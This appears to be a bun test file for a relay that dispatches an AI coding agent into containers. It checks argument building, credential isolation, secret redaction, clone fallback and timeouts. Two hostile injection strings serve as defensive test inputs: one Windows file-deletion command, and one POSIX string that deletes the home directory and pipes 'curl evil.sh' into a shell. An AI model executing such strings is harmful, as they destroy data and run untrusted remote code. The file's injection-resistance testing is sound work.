import { describe, expect, it } from "bun:test";
import type { ChildProcess } from "node:child_process";
import { EventEmitter } from "node:events";
import { join } from "node:path";
import {
	buildContainerArgs,
	buildOmpArgs,
	buildSetupHookEnv,
	buildWorkspaceCloneArgs,
	cloneWorkspaceWithMirrorFallback,
	deriveContainerName,
	deriveMirrorPath,
	executeJob,
	fenceEnv,
	type Job,
	parseAllowedModels,
	runSetupHook,
	type SpawnFn,
	scrubJobResult,
	tryPrepareRepoMirror,
} from "../relay/relay";

/** Minimal ChildProcess double: capture spawn inputs, emit scripted output. */
class FakeChild extends EventEmitter {
	readonly stdout = new EventEmitter();
	readonly stderr = new EventEmitter();
	killed = false;

	kill(_signal?: NodeJS.Signals | number): boolean {
		this.killed = true;
		queueMicrotask(() => this.emit("close", null));
		return true;
	}
}

interface SpawnCapture {
	command: string;
	args: readonly string[];
	options: { cwd: string; shell?: false; env?: NodeJS.ProcessEnv; detached?: boolean };
}

function makeSpawn(script: (child: FakeChild) => void): { spawn: SpawnFn; calls: SpawnCapture[] } {
	const calls: SpawnCapture[] = [];
	const spawnImpl: SpawnFn = (command, args, options) => {
		calls.push({ command, args, options });
		const child = new FakeChild();
		queueMicrotask(() => script(child));
		return child as unknown as ChildProcess;
	};
	return { spawn: spawnImpl, calls };
}

const WINDOWS_INJECTION = 'title" && del /q C:\\* && echo "pwned';
const POSIX_INJECTION = "title; rm -rf ~; $(curl evil.sh | sh) `reboot`";

describe("parseAllowedModels", () => {
	it("parses comma-separated ids and treats empty input as allow-nothing", () => {
		expect(parseAllowedModels("combo-a, combo-b ,")).toEqual(["combo-a", "combo-b"]);
		expect(parseAllowedModels("")).toEqual([]);
		expect(parseAllowedModels(undefined)).toEqual([]);
	});
});

describe("buildOmpArgs", () => {
	it("keeps shell metacharacters as one literal argv entry behind a -- separator", () => {
		for (const hostile of [WINDOWS_INJECTION, POSIX_INJECTION]) {
			const args = buildOmpArgs("combo-a", hostile);
			expect(args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", hostile]);
			// The prompt is one argv element, never split or rewritten.
			expect(args[args.length - 1]).toBe(hostile);
			// And it rides behind `--`, so a leading dash cannot become a flag.
			expect(args[args.indexOf("--") + 1]).toBe(hostile);
		}
	});

	it("keeps a flag-shaped prompt positional", () => {
		const args = buildOmpArgs("combo-a", "--api-key steal");
		expect(args.slice(args.indexOf("--"))).toEqual(["--", "--api-key steal"]);
	});
});
describe("container command assembly", () => {
	it("mounts and limits the job while forwarding only the agent allowlist", () => {
		const args = buildContainerArgs(
			{ model: "combo-a", prompt: "do the work", source: "github", githubToken: "ghs_leased" },
			"/srv/relay/job-1",
			{
				PATH: "/host/bin",
				HOME: "/host/home",
				HOST_SECRET: "must-not-cross",
				OMPK_FENCE_URL: "https://worker.test/fence-check",
				OMPK_FENCE_JOB: "job-1",
				OMPK_FENCE_ATTEMPT: "attempt-1",
				OMPK_FENCE_TOKEN: "fence-1",
				GH_TOKEN: "ghs_host",
				GIT_CONFIG_COUNT: "2",
				GIT_CONFIG_KEY_0: "core.hooksPath",
				GIT_CONFIG_VALUE_0: "/host/hooks",
				GIT_CONFIG_KEY_1: "url.auth.insteadOf",
				GIT_CONFIG_VALUE_1: "https://github.com/",
			},
			{ image: "registry.test/ompk-agent:1", name: deriveContainerName("job-1", "attempt-2", "agent") },
		);

		expect(args).toContain("/srv/relay/job-1:/workspace:Z");
		expect(args).toContain("--network=host");
		expect(args).toContain("--http-proxy=false");
		expect(args[args.indexOf("--name") + 1]).toBe("ompk-job-1-attempt-2-agent");
		expect(args[args.indexOf("--memory") + 1]).toBe("4g");
		expect(args[args.indexOf("--pids-limit") + 1]).toBe("2048");
		expect(args).toContain("HOME=/tmp/ompk-home");
		expect(args).toContain("GH_TOKEN=ghs_leased");
		expect(args).toContain("GIT_CONFIG_VALUE_0=/opt/ompk/git-hooks");
		expect(args.some(arg => arg.includes("must-not-cross"))).toBe(false);
		expect(args).not.toContain("PATH=/host/bin");
		expect(args.slice(-8)).toEqual([
			"registry.test/ompk-agent:1",
			"omp",
			"--print",
			"--yolo",
			"--model",
			"combo-a",
			"--",
			"do the work",
		]);
	});

	it("does not forward host GitHub credentials into a Linear container", () => {
		const args = buildContainerArgs(
			{ model: "combo-a", prompt: "linear work", source: "linear" },
			"/srv/relay/linear-job",
			{
				GH_TOKEN: "ghs_host_admin",
				GIT_CONFIG_COUNT: "1",
				GIT_CONFIG_KEY_0: "core.hooksPath",
				GIT_CONFIG_VALUE_0: "/host/hooks",
				GIT_CONFIG_KEY_1: "url.host-auth.insteadOf",
				GIT_CONFIG_VALUE_1: "https://github.com/",
			},
			{ image: "registry.test/ompk-agent:1" },
		);

		expect(args.some(arg => arg.includes("ghs_host_admin"))).toBe(false);
		expect(args.some(arg => arg.startsWith("GIT_CONFIG_KEY_1="))).toBe(false);
		expect(args.some(arg => arg.startsWith("GIT_CONFIG_VALUE_1="))).toBe(false);
		expect(args).toContain("GIT_CONFIG_COUNT=1");
	});
});

describe("setup hook isolation", () => {
	it("constructs setup env without GitHub, git-config, fence, or relay credentials", () => {
		const env = buildSetupHookEnv({
			PATH: "/usr/bin",
			HOME: "/safe-home",
			HTTPS_PROXY: "http://proxy.test",
			GH_TOKEN: "ghs_secret",
			GITHUB_TOKEN: "github-secret",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "url.auth.insteadOf",
			GIT_CONFIG_VALUE_0: "credentialed-url",
			OMPK_FENCE_TOKEN: "fence-secret",
			RELAY_TOKEN: "relay-secret",
			HOST_SECRET: "other-secret",
		});

		expect(env).toEqual({
			PATH: "/usr/bin",
			HOME: "/safe-home",
			HTTPS_PROXY: "http://proxy.test",
		});
		expect(env.GH_TOKEN).toBeUndefined();
		expect(env.GIT_CONFIG_COUNT).toBeUndefined();
		expect(env.OMPK_FENCE_TOKEN).toBeUndefined();
	});

	it("surfaces hook failure with scrubbed, truncated output", async () => {
		const secret = "ghs_setup_secret";
		const { spawn } = makeSpawn(child => {
			child.stdout.emit("data", `${secret}:${"x".repeat(5_000)}`);
			child.stderr.emit("data", `stderr ${secret}`);
			child.emit("close", 7);
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 1_000,
			hookExists: async () => true,
			redactionToken: secret,
		});

		expect(result?.success).toBe(false);
		expect(result?.error).toContain("setup hook .ompk/setup.sh failed with exit code 7");
		expect(result?.output).toContain("[redacted]");
		expect(result?.output).not.toContain(secret);
		expect(result?.output.length).toBeLessThan(4_200);
	});

	it("redacts repeated tokens split across the capture boundary", async () => {
		const secret = "ghs_boundary_secret";
		const split = 7;
		const { spawn } = makeSpawn(child => {
			child.stdout.emit("data", "x".repeat(4_080));
			child.stdout.emit("data", secret.slice(0, split));
			child.stdout.emit("data", secret.slice(split));
			child.stdout.emit("data", secret.repeat(100));
			child.emit("close", 9);
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 1_000,
			hookExists: async () => true,
			redactionToken: secret,
		});

		expect(result?.output).toContain("[redacted]");
		expect(result?.output).not.toContain(secret);
		expect(result?.output).not.toContain(secret.slice(0, split));
		expect(result?.output.length).toBeLessThan(4_200);
	});

	it("kills a timed-out hook and reports a transient job failure", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child;
			child.stdout.emit("data", "still installing");
		});
		const result = await runSetupHook("/workspace", {
			spawn,
			timeoutMs: 5,
			hookExists: async () => true,
		});

		expect(result?.success).toBe(false);
		expect(result?.error).toContain("setup hook .ompk/setup.sh timed out");
		expect(result?.output).toContain("still installing");
		expect(result?.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});
});

describe("GitHub clone mirror", () => {
	it("derives a stable mirror path and builds dissociated reference clones", () => {
		const mirror = deriveMirrorPath("/cache", "owner/name", "repo name");
		expect(mirror).toBe(join("/cache", ".mirrors", "owner_name-repo_name.git"));
		expect(buildWorkspaceCloneArgs("https://github.com/o/r.git", "/job", mirror)).toEqual([
			"clone",
			"--origin",
			"origin",
			"--reference-if-able",
			mirror,
			"--dissociate",
			"https://github.com/o/r.git",
			"/job",
		]);
		expect(buildWorkspaceCloneArgs("https://github.com/o/r.git", "/job", undefined)).toEqual([
			"clone",
			"--origin",
			"origin",
			"https://github.com/o/r.git",
			"/job",
		]);
	});

	it("creates a mirror on first use and falls back after an update failure", async () => {
		const mirror = deriveMirrorPath("/cache", "owner", "repo");
		const calls: string[][] = [];
		const created = await tryPrepareRepoMirror(mirror, "https://github.com/owner/repo.git", {}, "ghs_secret", {
			makeDir: async () => undefined,
			mirrorExists: async () => false,
			runGit: async args => {
				calls.push([...args]);
			},
		});
		expect(created).toBe(mirror);
		expect(calls[0]).toEqual(["clone", "--mirror", "https://github.com/owner/repo.git", mirror]);

		const warnings: string[] = [];
		const fallback = await tryPrepareRepoMirror(mirror, "https://github.com/owner/repo.git", {}, "ghs_secret", {
			makeDir: async () => undefined,
			mirrorExists: async () => true,
			runGit: async args => {
				calls.push([...args]);
				throw new Error("update rejected for ghs_secret");
			},
			warn: message => warnings.push(message),
		});
		expect(fallback).toBeUndefined();
		expect(calls.at(-1)).toEqual(["remote", "update", "--prune"]);
		expect(warnings[0]).toContain("using full clone");
		expect(warnings[0]).toContain("[redacted]");
		expect(warnings[0]).not.toContain("ghs_secret");
	});

	it("retries a failed reference clone without the mirror", async () => {
		const mirror = deriveMirrorPath("/cache", "owner", "repo");
		const calls: string[][] = [];
		const removed: string[] = [];
		const warnings: string[] = [];
		await cloneWorkspaceWithMirrorFallback(
			"https://github.com/owner/repo.git",
			"/job",
			mirror,
			"/cache",
			{},
			"ghs_secret",
			{
				runGit: async args => {
					calls.push([...args]);
					if (calls.length === 1) throw new Error("corrupt mirror ghs_secret");
				},
				removeWorkspace: async path => {
					removed.push(path);
				},
				warn: message => warnings.push(message),
			},
		);

		expect(calls[0]).toContain("--reference-if-able");
		expect(calls[1]).not.toContain("--reference-if-able");
		expect(calls[1]).not.toContain("--dissociate");
		expect(removed).toEqual(["/job"]);
		expect(warnings[0]).toContain("retrying full clone");
		expect(warnings[0]).toContain("[redacted]");
		expect(warnings[0]).not.toContain("ghs_secret");
	});
});

describe("scrubJobResult", () => {
	it("redacts the installation token from output and error text", () => {
		const scrubbed = scrubJobResult(
			{
				success: false,
				output: "fatal: unable to access https://x-access-token:ghs_secret123@github.com/a/b.git",
				error: "clone failed with ghs_secret123",
				failureClass: "transient",
			},
			"ghs_secret123",
		);
		expect(scrubbed.output).not.toContain("ghs_secret123");
		expect(scrubbed.error).not.toContain("ghs_secret123");
		expect(scrubbed.output).toContain("[redacted]");
	});

	it("passes results through when no token is present", () => {
		const result = { success: true, output: "done" };
		expect(scrubJobResult(result, undefined)).toEqual(result);
	});
});

describe("fence environment threading", () => {
	it("passes the hooks env through to the spawned process verbatim", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		const env = {
			OMPK_FENCE_URL: "https://worker.test/fence-check",
			OMPK_FENCE_JOB: "job-1",
			OMPK_FENCE_ATTEMPT: "attempt-1",
			OMPK_FENCE_TOKEN: "token-1",
			GIT_CONFIG_COUNT: "1",
			GIT_CONFIG_KEY_0: "core.hooksPath",
			GIT_CONFIG_VALUE_0: "/relay/git-hooks",
		};
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000, { env });
		expect(calls).toHaveLength(1);
		expect(calls[0]!.options.env).toEqual(env);
	});

	it("spawns with the inherited environment when no hooks env is given", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(calls[0]!.options.env).toBeUndefined();
	});

	it("injects GitHub credentials into the child env only for GitHub jobs", () => {
		const base: Job = {
			id: "job-1",
			issueId: "kingkillery/oh-my-pk#7",
			issueIdentifier: "kingkillery/oh-my-pk#7",
			model: "combo-a",
			prompt: "p",
			status: "leased",
			createdAt: "2026-08-06T00:00:00Z",
			attemptId: "attempt-1",
			leaseToken: "lease-1",
		};
		const linearEnv = fenceEnv(base);
		expect(linearEnv.GH_TOKEN).toBe(process.env.GH_TOKEN);
		expect(linearEnv.GIT_CONFIG_COUNT).toBe("1");

		const githubEnv = fenceEnv({
			...base,
			source: "github",
			githubToken: "ghs_abc",
			github: { owner: "kingkillery", repo: "oh-my-pk", number: 7, defaultBranch: "main" },
		});
		expect(githubEnv.GH_TOKEN).toBe("ghs_abc");
		expect(githubEnv.GIT_CONFIG_COUNT).toBe("2");
		expect(githubEnv.GIT_CONFIG_KEY_1).toBe("url.https://x-access-token:ghs_abc@github.com/.insteadOf");
		expect(githubEnv.GIT_CONFIG_VALUE_1).toBe("https://github.com/");
		expect(githubEnv.GIT_CONFIG_KEY_0).toBe("core.hooksPath");
	});
});

describe("executeJob", () => {
	it("rejects a model that is not allowlisted without spawning anything", async () => {
		const { spawn, calls } = makeSpawn(() => {});
		const result = await executeJob(
			{ model: "model-injected-by-issue", prompt: "whatever" },
			["combo-a"],
			spawn,
			1_000,
		);
		expect(result.success).toBe(false);
		expect(result.error).toContain("allowlist");
		// Another relay may carry this model: retryable, not terminal.
		expect(result.failureClass).toBe("transient");
		expect(calls).toHaveLength(0);
	});

	it("dispatches an allowed model without a shell and returns the child's output", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.stdout.emit("data", "task complete");
			child.emit("close", 0);
		});
		const result = await executeJob({ model: "combo-a", prompt: WINDOWS_INJECTION }, ["combo-a"], spawn, 1_000);
		expect(result).toEqual({ success: true, output: "task complete", error: undefined });
		expect(calls).toHaveLength(1);
		const call = calls[0]!;
		// No shell: options carry no shell flag, and argv holds the hostile prompt verbatim.
		expect("shell" in call.options ? call.options.shell : undefined).toBeFalsy();
		expect(call.args[call.args.length - 1]).toBe(WINDOWS_INJECTION);
		expect(call.command).not.toContain(WINDOWS_INJECTION);
	});
	it("keeps the bare omp command and inherited env when container overrides are absent", async () => {
		const { spawn, calls } = makeSpawn(child => {
			child.emit("close", 0);
		});
		await executeJob({ model: "combo-a", prompt: "plain" }, ["combo-a"], spawn, 1_000);

		expect(calls[0]?.command).toBe("omp");
		expect(calls[0]?.args).toEqual(["--print", "--yolo", "--model", "combo-a", "--", "plain"]);
		expect(calls[0]?.options.env).toBeUndefined();
	});

	it("reports a failing exit code with stderr as the error", async () => {
		const { spawn } = makeSpawn(child => {
			child.stderr.emit("data", "model exploded");
			child.emit("close", 3);
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.error).toBe("model exploded");
		// Clean non-zero exits are deterministic: never auto-retried.
		expect(result.failureClass).toBe("permanent");
	});

	it("times out a hung child and kills it", async () => {
		let spawned: FakeChild | undefined;
		const { spawn } = makeSpawn(child => {
			spawned = child; // never emits close
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 10);
		expect(result.success).toBe(false);
		expect(result.error).toContain("timed out");
		expect(result.failureClass).toBe("transient");
		expect(spawned?.killed).toBe(true);
	});

	it("awaits container cleanup before returning a timeout", async () => {
		let cleanupFinished = false;
		const { spawn } = makeSpawn(() => {});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 5, {
			command: "podman",
			args: ["run", "--name", "ompk-job-agent", "image", "omp"],
			nonZeroFailureClass: "transient",
			onTimeout: async () => {
				await Bun.sleep(5);
				cleanupFinished = true;
			},
		});

		expect(result.failureClass).toBe("transient");
		expect(result.error).toContain("timed out");
		expect(cleanupFinished).toBe(true);
	});

	it("classifies a spawn error as transient", async () => {
		const { spawn } = makeSpawn(child => {
			child.emit("error", new Error("EBUSY: omp binary locked"));
		});
		const result = await executeJob({ model: "combo-a", prompt: "p" }, ["combo-a"], spawn, 1_000);
		expect(result.success).toBe(false);
		expect(result.failureClass).toBe("transient");
	});
});
